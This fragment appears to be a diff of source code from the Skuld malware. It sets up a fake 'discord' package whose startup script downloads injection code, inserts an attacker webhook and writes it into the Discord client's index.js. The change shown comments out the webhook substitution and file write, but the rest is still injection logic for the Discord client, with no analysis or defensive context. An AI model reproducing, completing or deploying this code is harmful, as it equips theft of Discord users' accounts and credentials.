@@ -371,6 +371,7 @@ async function initiation() {
     fs.writeFileSync(packageJson, JSON.stringify({ name: 'discord', main: 'index.js' }, null, 4));
 
     const startUpScript = `
+
 const fs = require('fs');
 const https = require('https');
 const path = require('path');
@@ -396,8 +397,8 @@ async function loadInjection() {
         let data = '';
         res.on('data', chunk => data += chunk);
         res.on('end', () => {
-            data = data.replace('%WEBHOOK%', CONFIG.webhook);
-            fs.writeFileSync(indexJs, data);
+            //data = data.replace('%WEBHOOK%', CONFIG.webhook);
+            //fs.writeFileSync(indexJs, data);
             console.log('[+] Skuld Injection Loaded Successfully');
         });
     } catch (e) {
